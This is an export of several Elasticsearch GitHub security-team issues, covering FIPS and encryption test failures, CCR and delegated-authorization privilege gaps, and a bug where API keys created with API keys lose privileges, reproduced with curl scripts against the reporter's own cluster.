REPRODUCE WITH: ./gradlew ':modules:transport-netty4:internalClusterTest' --tests ""org.elasticsearch.transport.netty4.ESLoggingHandlerIT.testLoggingHandler"" -Dtests.seed=68432A0D9B4958C5 -Dtests.security.manager=true -Dtests.locale=id-ID -Dtests.timezone=PRT -Druntime.java=11 -Dtests.fips.enabled=true

org.elasticsearch.transport.netty4.ESLoggingHandlerIT > classMethod FAILED
    com.carrotsearch.randomizedtesting.UncaughtExceptionError: Captured an uncaught exception in thread: Thread[id=390, name=Thread-11, state=RUNNABLE, group=TGRP-ESLoggingHandlerIT]

        Caused by:
        java.lang.StackOverflowError
            at __randomizedtesting.SeedInfo.seed([68432A0D9B4958C5]:0)
            at java.base/java.util.regex.Pattern$BmpCharProperty.match(Pattern.java:3964)
            at java.base/java.util.regex.Pattern$GroupHead.match(Pattern.java:4804)
            at java.base/java.util.regex.Pattern$Loop.match(Pattern.java:4941)
            at java.base/java.util.regex.Pattern$GroupTail.match(Pattern.java:4863)
            at java.base/java.util.regex.Pattern$CharPropertyGreedy.match(Pattern.java:4306)
            at java.base/java.util.regex.Pattern$BmpCharProperty.match(Pattern.java:3964)
            at java.base/java.util.regex.Pattern$GroupHead.match(Pattern.java:4804)
            at java.base/java.util.regex.Pattern$Loop.match(Pattern.java:4941)
            at java.base/java.util.regex.Pattern$GroupTail.match(Pattern.java:4863)
            at java.base/java.util.regex.Pattern$CharPropertyGreedy.match(Pattern.java:4306)
```

Additionally ESLoggingHandlerIT seems to be logging ESLoggingHandler on TRACE level which does produce an obscene amount of log output


The java11, java15 ones ( both 7.12 as opposed to 7.x above ) still OOME'd but don't fail in the same way 

```
> Task :distribution:archives:integ-test-zip:checkMlCppNotice
java.nio.file.NoSuchFileException: /dev/shm/elastic+elasticsearch+7.12+matrix-java-periodic-fips/ES_RUNTIME_JAVA/java11/nodes/general-purpose/distribution/archives/integ-test-zip/build/zip-extracted/elasticsearch-7.12.1-SNAPSHOT/modules/x-pack-ml/NOTICE.txt
	at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92)
	at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:106)
	at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111)
	at java.base/sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:218)
	at java.base/java.nio.file.Files.newByteChannel(Files.java:375)
	at java.base/java.nio.file.Files.newByteChannel(Files.java:426)
	at java.base/java.nio.file.spi.FileSystemProvider.newInputStream(FileSystemProvider.java:420)
	at java.base/java.nio.file.Files.newInputStream(Files.java:160)
	at java.base/java.nio.file.Files.newBufferedReader(Files.java:2916)
	at java.base/java.nio.file.Files.readAllLines(Files.java:3396)
```

is the only thing I could see in the jenkins logs. 

More investigation to follow, not really sure what goes on atmI'd put a reasonable wager on this being related to Default-Distribution vs Integration-Distribution.
That would cause it to generate different logging when FIPS mode is enabled.For the ones who are curious what is going on: the `ESLoggingHandlerIT` turns on the `trace` log level which leads to `Netty` dumping raw messages (in hex) into logs. For some specific rare patterns (I have an example), the `MockLogAppender` filter blows with `StrackOverflowError`. The change to `MockLogAppender` filter to watch only for single line log statements (as expressed in expectations for `testLoggingHandler`) fixed the issue [1].

[1] https://github.com/opensearch-project/OpenSearch/pull/2051/files",no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,818801434,"Move API key documents out of the security index","With the increased usage of API keys (thousands and tens of thousands and frequent rekey?) as well as additional planned features like metadata (https://github.com/elastic/elasticsearch/issues/48182), it may be beneficial to move API key documents into its own index, separated from the main security index. The other open issue about ""last used"" tracking (https://github.com/elastic/elasticsearch/issues/54789) could also potential benefit from a separate API key index.

We do need to evaluate the situation and measure the performance carefully before making the decision. The issue is created to faciliate/kick off discussions.","Pinging @elastic/es-security (Team:Security)",no,":Security/Security,team-discuss,Team:Security,"
elastic/elasticsearch,681520704,"CCR exception on retention lease renewal","Based on the [doc](https://www.elastic.co/guide/en/elasticsearch/reference/current/ccr-getting-started.html#ccr-getting-started-prerequisites), the CCR on the remote/leader cluster can be configured using an user with a role like the follows:
```yaml
ccr_user:
  cluster:
    - read_ccr
  indices:
    - names: [ 'leader-index' ]
      privileges:
        - monitor
        - read
```

However, an exception about renewing retention lease will be thrown due to missing of `indices:admin/seq_no/renew_retention_lease` privilege. This behaviour seems to exist for a long while now (I tested with v7.6.2 to v7.9). I am surprised that no one has reported it. Given the retention lease renewal seems to be an implementation details, the potential solution is probably executing it under system context.

Here is the stacktrace shown in the log of the local/follower cluster (the exception actually happens on the remote/leader cluster, but it gets passed across the wire and only shows up in the local/follower cluster).
```
[2020-08-19T12:21:38,278][WARN ][o.e.x.c.a.ShardFollowTasksExecutor] [node-9] [follower-index][0] background management of retention lease [local/follower-index/00R3HMB3RYynV2qZcWHIkw-following-leader/leader-index/4IDla51RR724KrVQqcFZiA] failed while following
org.elasticsearch.ElasticsearchSecurityException: action [indices:admin/seq_no/renew_retention_lease] is unauthorized for user [ccr_user]
        at org.elasticsearch.xpack.core.security.support.Exceptions.authorizationError(Exceptions.java:34) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService.denialException(AuthorizationService.java:601) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService.access$300(AuthorizationService.java:95) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.handleFailure(AuthorizationService.java:648) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:634) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:604) ~[?:?]
        at org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:326) ~[?:?]
        at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:339) ~[?:?]
        at org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:270) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:235) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:200) ~[?:?]
        at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123) ~[?:?]
        at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.roles(CompositeRolesStore.java:159) ~[?:?]
        at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:276) ~[?:?]
        at org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129) ~[?:?]
        at org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117) ~[?:?]
        at org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:202) ~[?:?]
        at org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129) ~[?:?]
        at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323) ~[?:?]
        at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384) ~[?:?]
        at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395) ~[?:?]
        at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320) ~[?:?]
        at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261) ~[?:?]
        at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173) ~[?:?]
        at org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120) ~[?:?]
        at org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313) ~[?:?]
        at org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.InboundHandler$RequestHandler.doRun(InboundHandler.java:263) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226) ~[elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.InboundHandler.handleRequest(InboundHandler.java:176) [elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.InboundHandler.messageReceived(InboundHandler.java:93) [elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.InboundHandler.inboundMessage(InboundHandler.java:78) [elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.TcpTransport.inboundMessage(TcpTransport.java:692) [elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.InboundPipeline.forwardFragments(InboundPipeline.java:142) [elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.InboundPipeline.doHandleBytes(InboundPipeline.java:117) [elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.InboundPipeline.handleBytes(InboundPipeline.java:82) [elasticsearch-7.9.0.jar:7.9.0]
        at org.elasticsearch.transport.netty4.Netty4MessageChannelHandler.channelRead(Netty4MessageChannelHandler.java:76) [transport-netty4-client-7.9.0.jar:7.9.0]
        at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.handler.logging.LoggingHandler.channelRead(LoggingHandler.java:271) [netty-handler-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) [netty-common-4.1.49.Final.jar:4.1.49.Final]
        at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) [netty-common-4.1.49.Final.jar:4.1.49.Final]
        at java.lang.Thread.run(Thread.java:832) [?:?]
```


","Pinging @elastic/es-distributed (:Distributed/CCR)Pinging @elastic/es-security (:Security/Authorization)We discussed this issue recently and considered it a bug that should be fixed in phases:

1. Short term: Fix the documentation to explicitly state that the `manage` index privilege is required on the leader cluster.
2. Long term: Revisit all privileges required for CCR and take future direction of CCR/CCS into consideration.",no,">bug,:Distributed/CCR,:Security/Authorization,Team:Distributed,Team:Security,"
elastic/elasticsearch,1257221449,"[CI] DecryptionPacketsInputStreamTests testSuccessEncryptAndDecryptTypicalPacketLength failing","### CI Link

https://gradle-enterprise.elastic.co/s/afglqa56dts6e

### Repro line

./gradlew ':x-pack:plugin:repository-encrypted:test' --tests ""org.elasticsearch.repositories.encrypted.DecryptionPacketsInputStreamTests.testSuccessEncryptAndDecryptTypicalPacketLength"" \   -Dtests.seed=544B090874C4983A \   -Dtests.locale=da-DK \   -Dtests.timezone=Iran \   -Druntime.java=17 \   -Dtests.fips.enabled=true

### Does it reproduce?

No

### Applicable branches

8.3

### Failure history

Based on build emails, may be the first time it failed recently?

### Failure excerpt

```
org.elasticsearch.repositories.encrypted.DecryptionPacketsInputStreamTests > testSuccessEncryptAndDecryptTypicalPacketLength FAILED |  
-- | --
  | java.io.IOException: Exception during packet decryption |  
  | at __randomizedtesting.SeedInfo.seed([544B090874C4983A:63F608DDE1AA8B8]:0) |  
  | at org.elasticsearch.repositories.encrypted.DecryptionPacketsInputStream.decrypt(DecryptionPacketsInputStream.java:164) |  
  | at org.elasticsearch.repositories.encrypted.DecryptionPacketsInputStream.nextComponent(DecryptionPacketsInputStream.java:107) |  
  | at org.elasticsearch.repositories.encrypted.ChainingInputStream.nextIn(ChainingInputStream.java:416) |  
  | at org.elasticsearch.repositories.encrypted.ChainingInputStream.read(ChainingInputStream.java:220) |  
  | at java.base/java.io.InputStream.readNBytes(InputStream.java:409) |  
  | at java.base/java.io.InputStream.readAllBytes(InputStream.java:346) |  
  | at org.elasticsearch.repositories.encrypted.DecryptionPacketsInputStreamTests.testEncryptAndDecryptSuccess(DecryptionPacketsInputStreamTests.java:165) |  
  | at org.elasticsearch.repositories.encrypted.DecryptionPacketsInputStreamTests.testSuccessEncryptAndDecryptTypicalPacketLength(DecryptionPacketsInputStreamTests.java:55) |  
  |   |  
  | Caused by: |  
  | javax.crypto.AEADBadTagException: Error finalising cipher data: mac check in GCM failed |  
  | at java.base/jdk.internal.reflect.GeneratedConstructorAccessor16.newInstance(Unknown Source) |  
  | at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) |  
  | at java.base/java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:499) |  
  | at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:480) |  
  | at org.bouncycastle.jcajce.provider.ClassUtil.throwBadTagException(Unknown Source) |  
  | at org.bouncycastle.jcajce.provider.BaseCipher.engineDoFinal(Unknown Source) |  
  | at org.bouncycastle.jcajce.provider.BaseCipher.engineDoFinal(Unknown Source) |  
  | at java.base/javax.crypto.Cipher.doFinal(Cipher.java:2337) |  
  | at org.elasticsearch.repositories.encrypted.DecryptionPacketsInputStream.decrypt(DecryptionPacketsInputStream.java:162) |  
  | ... 7 more
```","Pinging @elastic/es-distributed (Team:Distributed)Pinging @elastic/es-security (Team:Security)@albertzaharovits could you take a look here? This is beyond my encryption skills :)",no,":Distributed/Snapshot/Restore,>test-failure,:Security/Security,Team:Distributed,Team:Security,"
elastic/elasticsearch,1091285726,"For delegated authorization realms, preserve user metadata from the authenticating realm when constructing the User object","Compare what happens when delegated authorization (authz) is enabled or disabled in an authenticating realm.

Important code:
```
- DelegatedAuthorizationSupport.resolve(String username, ActionListener<AuthenticationResult<User>> resultListener)
- UserData(principal, dn, groups, metadata, realm)
- User(principal, roles, fullName, email, metadata, enabled)
```

Examples:

1. [OpenIdConnectRealm.buildUserFromClaims()](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/oidc/OpenIdConnectRealm.java#L208): If delegated authz is off, User objects are constructed using JWT claims like principal, fullName, email, and metadata. If delegated authz is on, only principal (ex: parsed ""sub"" claim) is passed to authz realms, so User objects cannot populate JWT claims into the fullName, email, and metadata fields.
2. [LdapRealm.buildUser()](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/ldap/LdapRealm.java#L224): If delegated authz is off, User objects are constructed using principal and metadata. If delegated authz is on, only principal (ex: parsed CN value) is passed to authz realms, so User objects will lack metadata from the authc realm (i.e. ""ldap_dn"" and ""ldap_groups"").

Generalization:

If delegated authz is **off**, the authc realm does:
- **role mapping** using _principal_, _dn_, _groups_, and _metadata_.
- **User construction** using _principal_, _fullName_, _email_, and _metadata_.

If delegated authz is **on**, the authz realm does:
- **role mapping** using _principal_ only; **ignored values** are _dn_, _groups_, and _metadata_.
- **User construction** using _principal_ only; **ignored values** are _fullName_, _email_, and _metadata_.

Delegating role mapping by principal only is probably OK. However, only passing the principal for delegated User object construction is an issue. The two use cases of delegated authz on or off are inconsistent for how non-role fields get populated in the User object. Also, those non-role Use fields could be useful for other use cases like Elasticsearch audit logging, Kibana user display, etc.

Potential options:

1. Status quo. Let authz realms resolve both role mapping and User construction. Only pass the principal.
2. Let authz realm resolve both role mapping and User construction. Role mapping remains principal only, but pass the missing authc details through to use during User object construction.
3. Let authz realm resolve role mapping only. Return the resolved roles to the authc realm, and let the authc realm choose the non-role User fields for object construction.

To be determined:

1. Are non-realms affected (i.e. ServiceTokenAuthenticator, OAuth2Authenticator, ApiKeyAuthenticator)?

Context:

This issue was discovered while thinking through how a JWT realm can construct the User object. Looking at potential reuse of OIDC code, it seemed odd that enabling delegated authz meant metadata from JWT claims do not get populated in the User object.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,:Security/Authorization,team-discuss,Team:Security,"
elastic/elasticsearch,563569928,"Allow requests that are authenticated with API keys to create new API keys","**Elasticsearch version**: Version: 7.5.2, Build: default/tar/8bec50e1e0ad29dad5653712cf3bb580cd1afcdf/2020-01-15T12:11:52.313576Z, JVM: 13.0.1

**Plugins installed**: []

**JVM version**:

openjdk 13.0.1 2019-10-15
OpenJDK Runtime Environment AdoptOpenJDK (build 13.0.1+9)
OpenJDK 64-Bit Server VM AdoptOpenJDK (build 13.0.1+9, mixed mode, sharing)

**OS version**: Debian GNU/Linux 9 (stretch)

**Description of the problem including expected versus actual behavior**:

If an API key is created via a request that is authenticated with an API key, the privileges of the first API key do not transfer to the second API key. However, privileges are maintained if an API key is created using the basic auth with a username and password.

# Step to reproduce:

I spent all day trying to debug this issue, and I ended up writing a small script to reproduce it with bash to rule out issues with any high-level libraries I was using.

### Set environment variables
```bash
export ES_URL=<redacted>
export SUPERUSER_PW=<redacted>
 ```
Create an `Authorization` header with the `username:password` format:
```bash
BASIC_AUTH_HEADER=$(echo -n ""elastic:${SUPERUSER_PW}"" | base64)
```

### Minimal API key creation request

Create an API key with no role descriptors, and use basic auth to authenticate the request. Then, combine the `id` and `api_key` fields from the response object with a colon, and base64-encode them for use in future requests.
```bash
KEY_FROM_BASIC_AUTH=$(curl -s -X POST ${ES_URL}/_security/api_key \
    -H 'Content-Type: application/json' \
    -H ""Authorization: Basic ${BASIC_AUTH_HEADER}"" \
    -d '{
        ""name"": ""super_user_api_key"",
        ""expiration"": ""10m""
        }')
```

#### Encode the response object
```bash
KEY_FROM_BASIC_AUTH_HEADER=$(echo $KEY_FROM_BASIC_AUTH | jq -j '.id + "":"" + .api_key' | base64)
```

#### Check the privileges of the `super_user_api_key` token
```bash
Δ ~/ > curl -s -X GET ${ES_URL}/_security/user/_has_privileges \
    -H 'Content-Type: application/json' \
    -H ""Authorization: ApiKey ${KEY_FROM_BASIC_AUTH_HEADER}"" \
    -d '{
            ""cluster"": [
                ""manage_own_api_key"",
                ""manage_api_key"",
                ""monitor""
            ],
            ""index"": [
                {
                    ""names"": [""*""],
                    ""privileges"": [
                        ""read"",
                        ""write""
                    ]
                }
            ]
        }' | jq
```
Response:
```json
{
  ""username"": ""elastic"",
  ""has_all_requested"": false,
  ""cluster"": {
    ""monitor"": true,
    ""manage_api_key"": true,
    ""manage_own_api_key"": false
  },
  ""index"": {
    ""*"": {
      ""read"": true,
      ""write"": true
    }
  },
  ""application"": {}
}
```

### Create an API key from an API key
Do the same as the above request, but authenticate it with an `ApiKey` authorization header:
```bash
KEY_FROM_APIKEY_AUTH=$(curl -s -X POST ${ES_URL}/_security/api_key \
    -H 'Content-Type: application/json' \
    -H ""Authorization: ApiKey ${KEY_FROM_BASIC_AUTH_HEADER}"" \
    -d '{
        ""name"": ""api_key_from_api_key"",
        ""expiration"": ""10m""
        }')

KEY_FROM_APIKEY_AUTH_HEADER=$(echo $KEY_FROM_APIKEY_AUTH | jq -j '.id + "":"" + .api_key' | base64)
```

#### Check the privileges of the API key created with an API key, `api_key_from_api_key`
```bash
Δ ~/ > curl -s -X GET ${ES_URL}/_security/user/_has_privileges \
    -H 'Content-Type: application/json' \
    -H ""Authorization: ApiKey ${KEY_FROM_APIKEY_AUTH_HEADER}"" \
    -d '{
            ""cluster"": [
                ""manage_own_api_key"",
                ""manage_api_key"",
                ""monitor""
            ],
            ""index"": [
                {
                    ""names"": [""*""],
                    ""privileges"": [
                        ""read"",
                        ""write""
                    ]
                }
            ]
        }' | jq
```

#### Response shows privileges are lost
```json
{
  ""username"": ""elastic"",
  ""has_all_requested"": false,
  ""cluster"": {
    ""monitor"": false,
    ""manage_api_key"": false,
    ""manage_own_api_key"": false
  },
  ""index"": {
    ""*"": {
      ""read"": false,
      ""write"": false
    }
  },
  ""application"": {}
}
```

### Create key using `role_descriptors` field

Just to make sure it's not an issue of an invisible empty body or some other unseen issue, create another API key using the first API key, and specifying the privileges we want the new key to keep:

```bash
KEY_WITH_ROLE_DESCRIPTORS=$(curl -s -X POST ${ES_URL}/_security/api_key \
    -H 'Content-Type: application/json' \
    -H ""Authorization: ApiKey ${KEY_FROM_BASIC_AUTH_HEADER}"" \
    -d '{
            ""name"": ""api_key_with_role_descriptors"",
            ""expiration"": ""10m"",
            ""role_descriptors"": {
                ""test-role"": {
                    ""cluster"": [ ""manage_api_key"", ""manage_own_api_key"", ""monitor"" ],
                    ""index"": [
                        {
                            ""names"": [""*""],
                            ""privileges"": [""all""],
                        }
                    ]
                }
            }
        }')

KEY_WITH_ROLE_DESCRIPTORS_HEADER=$(echo $KEY_WITH_ROLE_DESCRIPTORS | jq -j '.id + "":"" + .api_key' | base64)
```

#### API key with role descriptors and created by API key also loses privileges
```bash
Δ ~/ > curl -s -X GET ${ES_URL}/_security/user/_has_privileges \
    -H 'Content-Type: application/json' \
    -H ""Authorization: ApiKey ${KEY_WITH_ROLE_DESCRIPTORS_HEADER}"" \
    -d '{
            ""cluster"": [
                ""manage_own_api_key"",
                ""manage_api_key"",
                ""monitor""
            ],
            ""index"": [
                {
                    ""names"": [""*""],
                    ""privileges"": [
                        ""read"",
                        ""write""
                    ]
                }
            ]
        }' | jq
```

Response:
```json
{
  ""username"": ""anonymous_search_user"",
  ""has_all_requested"": false,
  ""cluster"": {
    ""monitor"": false,
    ""manage_api_key"": false,
    ""manage_own_api_key"": false
  },
  ""index"": {
    ""*"": {
      ""read"": false,
      ""write"": false
    }
  },
  ""application"": {}
}
```

","Pinging @elastic/es-security (:Security/Authentication)Sorry, this is a known bug & we haven't reached an agreement on the solution. It may be that we completely disable the creation of API keys when authenticationed with another API key, because it is difficult to determine what the right semantics ought to be for this.

Can you explain your intended use case for this? That will help us work out what direction we want to take.> Sorry, this is a known bug & we haven't reached an agreement on the solution. It may be that we completely disable the creation of API keys when authenticationed with another API key, because it is difficult to determine what the right semantics ought to be for this.

@tvernum In the meantime, I would strongly urge you to document that you can't create API keys with other API keys to prevent anyone else from also wasting a day debugging this!

> Can you explain your intended use case for this? That will help us work out what direction we want to take.

## My use case

We have many environments all writing to a centralized cluster. Production sites feed into a production index, staging sites feed into a staging index, etc. Originally, the script I wrote to manage this used one machine user that is accessed via an API key to create API keys `run_as` other users that have the set of permissions that we want each API key to have. After I ran into issues with that, I started to generate API keys for each of the intermediary users directly (rather than with requests `run_as` those users) so that they could then generate API keys with the necessary roles.

So for example, if a staging site needs API credentials to be able to write to the index, then the `indexer-staging` user that has the necessary privileges will create an API key that can be given to the staging site.

I prefer the method of accessing everything with API keys because it allows for easy and frequent rotation of API keys. In fact, the base machine user is _only_ accessible via API key, because it is created with a `password_hash` that's purposely corrupted (i.e. taking a hash like `$2y$04$c6XLQlGgRUi/o8if98urVOEvBLmursKQOYsml9coXc7s.W9N8/f8y` and replacing a bunch of characters with zeros like `$2y$04$c6XLQlGgRUi/o8if0000000000000000OYsml9coXc7s.W9N8/f8y`) to essentially disable password login for that user.

However, in my particular use case, the base machine user and the intermediary users are only ever used from the server that's running Elasticsearch itself, so I can just switch those to use passwords in the meantime.

## My ideal solution

I have two thoughts about how API keys should be implemented.

### Machine users

The first is that there should be a type of user specifically for system/machine users. I initially use the `elastic` account to create the `machine_user_owner` account (with the corrupted password hash to make direct login impossible), and then I use the `elastic` credentials to run as the machine user to generate an API key. **It would be nice if I could create a user that didn't have the option for password login at all**, and that the only way to use that user is to access it via API generated by another user running as that machine user.

### Permissions model

The second is that an API key should be _continually_ associated with a user. That is, rather than an API key having a point-in-time snapshot of the authenticated user's permissions, each API key should have the permissions that are the intersection of the authenticated user's permissions and any `role_descriptors`.

Let's say I create three roles:

```json
POST /_security/role/cluster_manager
{
    ""cluster"": [ ""manage"", ""manage_own_api_key"", ""monitor"" ],
    ""indices"": [{ ""names"": [""*""], ""privileges"": [""all""] }]
}
```

```json
POST /_security/role/index_manager
{
    ""indices"": [{ ""names"": [""*""], ""privileges"": [""all""] }]
}
```

```json
POST /_security/role/index_reader
{
    ""indices"": [{ ""names"": [""*""], ""privileges"": [ ""read"", ""view_index_metadata"" ] }]
}
```

#### API keys should continually reflect a user's privileges

I assign all three of these roles to `test_user_1`. Let's say `test_user_1` creates an API key with no `role_descriptors`, such as:

```json
POST /_security/api_key
{
    ""name"": ""all-privileges-key"",
    ""expiration"": ""1d""
}
```

That should result in an API key with the permissions of all of these roles:

![](https://user-images.githubusercontent.com/542937/74366517-2b9b7000-4d9e-11ea-9a6f-80191d544fec.png)


Ideally, if I remove the `cluster_manager` and `index_manager` roles from the user `test_user_1` at a point in the future, then the `all-privileges-key` would also lose its ability to manage the cluster and write to any indices, and the privileges of `all-privileges-key` would be reduced to reflect that it only has the privileges of the `index_reader` role:

![](https://user-images.githubusercontent.com/542937/74366644-5eddff00-4d9e-11ea-9fb9-54bf0c07ebd9.png)

#### Role descriptors should reflect the _maximum_ permissions of a key

Let's say `test_user_2` still has all threes of these roles above, and I create an API key with restrictive `role_descriptors`, such as:

```json
POST /_security/api_key
{
    ""name"": ""index-privileges-key"",
    ""expiration"": ""1d"",
    ""role_descriptors"": {
        ""cluster"": [],
        ""index"": [{ ""names"": [""*""], ""privileges"": [""all""] }]
    }
}
```

This API key would be limited to the intersection of the user's privileges and the `role_descriptors`, so it would only have index privileges, because it was specified as having no cluster privileges:

![](https://user-images.githubusercontent.com/542937/74367082-40c4ce80-4d9f-11ea-8dee-b9cc21888c01.png)


Then, if I remove the `index_manager` and `cluster_manager` roles from `test_user_2` at a point in the future, the `index-privileges-key` should also lose its ability to write to indices, resulting in the permissions of:

![](https://user-images.githubusercontent.com/542937/74367320-a5802900-4d9f-11ea-9267-6dca6e9efce1.png)

#### Keys created with keys

And of course, we can't forget about the original issue of keys created with keys. In this case, I think that the permissions of keys created with keys should reflect the intersection of
- creator's privileges at any given time
- `role_descriptors` defined when creating the first key
- `role_descriptors` defined when creating the second key

Thus, even if the creator is the superadmin, if the first key is created with _no_ cluster permissions aside from `manage_own_api_key`, then no child API key will ever be able to have cluster permissions.In our project we have a similar problem where we want to create an API key that can create API Keys. What we do at the moment is we create a user with a role, store its password and then use this user to create API Keys. It would be nicer to just have an API key, so no role needed and no password to be stored, only the API Key.

The expectation on the behaviour from my side would be:

* The initial user that creates the API key assigns the required permissions to the API. One of these permissions would be `create_api_key` (does not exist today).
* The API Key that then creates API keys, creates an API Key with the same permissions it has without the `create_api_key` permission to make sure this API keys can't create other API keys.

